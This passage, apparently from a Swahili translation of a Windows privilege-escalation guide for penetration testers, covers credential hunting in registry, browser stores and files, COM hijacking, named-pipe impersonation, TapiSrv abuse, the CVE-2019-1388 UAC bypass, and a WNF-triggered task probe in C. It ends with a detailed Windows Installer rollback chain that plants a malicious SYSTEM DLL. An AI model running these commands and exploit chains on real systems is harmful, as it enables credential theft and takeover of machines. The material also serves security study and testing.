Pia kagua hifadhidata za wasifu wa messaging-client, madokezo, na faili zilizopokelewa unazoweza kufikia ili kutafuta vidokezo vya credentials. Nakala ya urejeshaji ya BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu ikiwa unaidhinishwa kufanya hivyo. Ikiwa nakala rudufu ina `NTDS.dit`, urejeshaji wa credentials za domain nje ya mtandao pia unahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [workflow ya nakala rudufu na privileged-groups](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kwamba kuna key ya urejeshaji inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha manenosiri** yaliyohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vyenye credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako nywila za **Chrome au Firefox** huhifadhiwa.\
Unapaswa kuangalia dbs ambako nywila za **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili kuona kama huenda **nywila zimehifadhiwa** humo.

Kwa wasifu wa kawaida wa **Default** wa Edge wa mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ilhali `Local State` iko kwenye saraka yake kuu ya `User Data`. [Microsoft inaandika mahali chaguomsingi pa wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kuuhamisha. Uwepo wa faili ni kidokezo tu cha mahali panapohifadhi vitambulisho: thibitisha kuwa faili zinaweza kusomeka, muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine ya ufunguo iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye haki za juu zaidi. Kuhesabu njia pekee hakuhitaji kufungua database au kuonyesha nywila zilizofumbuliwa.

Kwa Firefox, [Mozilla inaandika](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za wasifu ni faili zinazolingana za ufunguo na login zilizofumbuliwa. Uwepo wake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomeka, kama kuna maingizo yaliyohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa vitambulisho vinaweza kutumika. Ikiwa kitambulisho kilichopatikana ni cha akaunti ya domain, kagua kando haki za udhibiti wa vikundi zinazotumika kwa akaunti hiyo na haki za kikundi za [kusoma au kufumbua nywila za LAPS](../active-directory-methodology/laps.md); mabaki ya kivinjari pekee hayathibitishi njia ya kupata haki za msimamizi.

Tools za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kupitia interface IDs (IIDs).

Madarasa na violesura vya COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSID za registry hii unaweza kupata registry tanzu ya **InProcServer32**, iliyo na **thamani chaguomsingi** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSID za registry hii unaweza kupata registry tanzu ya InProcServer32, iliyo na thamani chaguomsingi inayoelekeza kwenye DLL na thamani...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayoendeshwa, unaweza **kuongeza haki** ikiwa DLL hiyo itaendeshwa na mtumiaji tofauti.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama njia ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Kutafuta Nywila kwa Jumla kwenye Faili na Registry**

**Kutafuta maudhui ya faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyounda ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za zana mbalimbali zinazohifadhi data hii kwa maandishi ya kawaida (PuTTY, WinSCP, FileZilla, SuperPuTTY na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu upate maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles nyingine zilizo wazi za processes na threads zilizoirithiwa zikiwa na viwango tofauti vya permissions (si ufikiaji kamili tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo roles hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga hukupa nafasi ya **kupata privileges za juu zaidi** kwa kujifanya kuwa process hiyo mara inapoingiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, zana ifuatayo inaruhusu **kunasa mawasiliano ya named pipe kwa kutumia zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliyeidhinishwa kwa mbali anaweza kutumia vibaya njia ya matukio ya async inayotumia mailslot na kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** wa hiari kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za admin za Telephony na kupakia DLL yoyote kama huduma. Mtiririko kamili:

- `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kuwa njia iliyopo inayoweza kuandikiwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app ukitumia `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia uandishi unaotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya Faili vinavyoweza kutekeleza vitu kwenye Windows

Tembelea ukurasa wa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia visomaji vya Markdown

Viungo vya Markdown vinavyoweza kubofyekwa vikipelekwa kwa `ShellExecuteExW` vinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambulizi kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili kupata nywila**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji mwenye haki za chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii hurahisisha kuongeza haki na kupita UAC kwa wakati mmoja kwa kutumia vulnerability hiyo hiyo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imetiwa sahihi na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili kutumia udhaifu huu, ni lazima utekeleze hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuingiza Junctions za Directory kwenye Root Inayohudumiwa

Programu inaweza kuunda subdirectory ya upload inayotabirika, kuandika filename iliyotolewa na caller ndani yake, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye low privilege anaweza kuondoa subdirectory hiyo na kuiweka upya kama NTFS junction kabla ya server kuandika faili, uandishi unaweza kufuata junction hadi kwenye directory inayohudumiwa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa server hutekeleza aina hiyo ya faili. Hii ni mpaka wa arbitrary-write unaotegemea programu husika; directory ya upload inayoweza kuandikiwa au junction iliyopo pekee havithibitishi hili.

Kagua ujenzi halisi wa path na muda wa tukio kwenye upload handler, ruhusa za mtumiaji za kufuta/kuunda subdirectory, ACLs za destination, ikiwa writer hufuata reparse points, na ikiwa web server hutekeleza faili kwenye destination hiyo. Thibitisha utambulisho wa process ya writer na wa web server kila mmoja kivyake. Passive inventory inaweza kuonyesha directory ACLs na reparse metadata, lakini haiwezi kubaini tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa execution itafanyika kwa service account, kagua **token halisi ya process** kabla ya kuzingatia njia tofauti ya token-privilege.

## Usafishaji wa scheduled-task wenye privilege unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mkono bado inaweza kuwa na njia ya trigger inayopatikana kwa mtumiaji asiye na privilege. Unapokagua task yenye privilege, export XML yake na kagua **triggers zote** pamoja na task DACL, principal na action. Hasa, `WnfStateChangeTrigger` hutaja state ya Windows Notification Facility (WNF); ikiwa state hiyo inayolindwa inaruhusu mtumiaji wa sasa kuchapisha update, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja, chini ya utambulisho wake uliosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ilikubali updates za WNF state `7508BCA32C079E41` kutoka kwa standard user, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata wakati Recall ilikuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kujaribu ufikikaji, tafuta `ZwUpdateWnfStateData` katika `ntdll.dll`, tuma sasisho tupu kwa jina la state lenye baiti nane, kisha linganisha hali ya urejeshaji na data ya mara ya mwisho kazi ilipoendeshwa au shughuli za Procmon. Probe iliyopunguzwa hapa chini inatumia mfuatano wa baiti kutoka kwenye mfano wa kazi ya Recall; badilisha baiti hizo kwa zile zilizotolewa kwa kazi inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji wa kujirudia kuwa ufutaji wenye ruhusa za juu

Primitive muhimu si kichochezi pekee, bali ni utaratibu wa usafishaji wenye ruhusa za juu unaokubali saraka inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia uorodheshaji hadi mabadiliko ya mwisho: ugunduzi wa wasifu/vikao, watoto waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria madhubuti kwamba njia ya jina iliyokaguliwa awali itafuatiliwa baadaye kwa kujirudia. Ikiwa vizazi havifunguliwi kuhusiana na handles za saraka zinazoaminika na kuthibitishwa kabla ya kufuta, mshambuliaji anaweza kubadilisha uelekezaji kati ya uorodheshaji na matumizi.<sup>[[43]](#references)</sup>

Oanisha kichochezi cha WNF na [ubadilishaji wa oplock, junction na Object Manager symlink](#from-folder-contents-delete-to-system-eop) ulioelezwa hapa chini: oplock husitisha cleaner baada ya kuchagua mtoto halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wenye ruhusa za juu unapoendelea, uelekezwe kupitia `\RPC Control` hadi kwenye lengwa lililolindwa. Katika msururu wa Recall, hili lilisababisha ufutaji wa `C:\Config.Msi` na SYSTEM, uliotakiwa na mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Vizazi vilivyo ndani zaidi hupita marekebisho ya juu juu ya reparse point

Kuthibitisha tu mzizi unaodhibitiwa na mshambuliaji na mtoto wake wa moja kwa moja hakulindi ufutaji wa kujirudia unaotumia njia za majina. Acha vitu hivyo vilivyokaguliwa viendelee kuwa halali, kisha hamishia ubadilishaji wa junction/oplock kwenye mtoto mwingine aliye chini yake; `IFileOperation::DeleteItem` hatimaye hufikia kizazi kisichothibitishwa na kufuata lengwa lake jipya. CVE-2026-20941 ilitokana hasa na aina hii ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na saraka yenye umbo la GUID lakini ikaacha operesheni ya zamani ya ufutaji wa kujirudia.<sup>[[43]](#references)</sup>

Mbinu salama ni kufungua **kila kizazi** kuhusiana na handle ya saraka ambayo tayari inaaminika, kupata na kuthibitisha njia/kitu cha mwisho kilichotatuliwa, kisha kutumia disposition ya ufutaji kwenye handle hiyo iliyothibitishwa. Usithibitishe kiambishi awali kisha urudi kwenye ufutaji wa kujirudia unaotumia njia za majina. Wakati wa kukagua patch, kagua pia miundo ya data kwenye sehemu halisi ya mwito: katika hali hii, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina la jamaa `{GUID}\\secure_file.lock`, na hivyo kukanusha matokeo ya kupotosha ya decompiler yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Ufutaji/Usogezi/Ubadilishaji wa Jina wa Folda Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na msimbo wa exploit [**unaopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili linahusisha kutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali na zenye madhara wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer yenye madhara** itakayotumiwa kuteka folda ya `C:\Config.Msi`, ambayo Windows Installer itatumia baadaye kuhifadhi faili za rollback wakati wa kuondoa vifurushi vingine vya MSI; faili hizo za rollback zitakuwa zimebadilishwa ili ziwe na payload yenye madhara.

### Uingizaji wa njia ya usafishaji ya Windows Installer COM (CVE-2025-27727)

Mteja mwenye ruhusa ndogo anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia kitu cha COM cha `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Uhandisi wa kurudi nyuma ulibaini miito husika ya `IMsiServer` kuwa `MsiBeginTransactionW` kwenye nafasi ya vtable `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na nafasi hizi zilibainishwa kwa uhandisi wa kurudi nyuma na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye msimamizi, `SetEEUIDirectoryAndFilter` hujifanya caller kwa muda mfupi tu wakati wa kufungua njia iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hili linathibitisha kwamba caller anaweza kufuta saraka na huepuka kufuata reparse point, lakini **haliunganisha** file object iliyokaguliwa na usafishaji wa baadaye, wala kuthibitisha kwamba Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga njia hiyo kama folda bila kujali hoja ya filter ya caller. Huduma huandika thamani ya `REG_DWORD` yenye jina chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni njia inayodhibitiwa na caller, na data `0x00000002` ni flag ya folda. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye usafishaji. Worker wake yenye ruhusa za juu huorodhesha thamani za registry na kupitisha maingizo ya folda kwa `FDeleteFolder` inayofuta kwa kujirudia bila kukagua asili ya njia. Ikiwa uondoaji wa kawaida hautafaulu, msimbo pia huita `LockdownPath`, huondoa sifa za faili, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena njia badala ya kuelekeza kupitia junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena jina hilo hilo la njia likiwa na data ya rollback iliyolindwa. Usafishaji huamini jina lililopitwa na wakati la `TempPackages` na kufuta saraka mpya kama SYSTEM. Hii hupita mpaka uliokusudiwa wa `FILE_FLAG_OPEN_REPARSE_POINT` na uzuiaji wa kuamini uelekezaji upya, kwa sababu hakuna reparse point inayohitajika.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika mnyororo wa rollback ulio hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle yenye ruhusa ya `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL isiyo na vizuizi kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha njia hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` wakati kipengele kipya cha kudhibiti kimewezeshwa. COM call bado inaweza kurudisha mafanikio, lakini haiweki tena njia inayodhibitiwa na mshambuliaji katika `TempPackages`. Tumia masasisho ya usalama ya Windows ya Aprili 2025 badala ya kutumia matokeo ya mafanikio ya method kama kipimo cha kiraka.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) katika folda inayoweza kuandikika (`TARGETDIR`).
    - Weka alama kuwa installer ni **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ya faili ikiwa wazi baada ya usakinishaji.

- Hatua ya 2: Anza Kuondoa
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa kuondoa huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (nakala rudufu za rollback).
    - **Fuatilia handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara `.rbf` inapoandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uondoaji.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia kufutwa kwake**.
    - Kisha **tuma ishara ya kurudisha** ili uondoaji ukamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Katika hatua hii, **chochea udhaifu wa kufuta folda kiholela katika kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` Ikiwa na ACL Dhaifu
    - Unda tena folda ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle ikiwa wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Kigezo kinachosababisha hitilafu ya lazima.
    - Usakinishaji huu utatumika kuchochea **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapoonekana.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL **hutekelezwa tu wakati handle inafunguliwa**, kwa hivyo bado unaweza kuandika kwenye folda.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` kwa **rollback script bandia** inayoiambia Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye ruhusa za juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` bandia yenye **DLL ya payload hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Chochea Rollback
    - Tuma ishara ya tukio la usawazishaji ili installer iendelee.
    - **Custom action ya aina ya 19 (`ErrorOut`)** imewekwa **kufeli usakinishaji kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` hadi mahali lengwa.
    - Sasa una **DLL yako hasidi katika njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Msimbo wa SYSTEM
    - Endesha **binary inayoaminika inayopandishwa ruhusa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka.
    - **Basi**: Msimbo wako hutekelezwa **kama SYSTEM**.


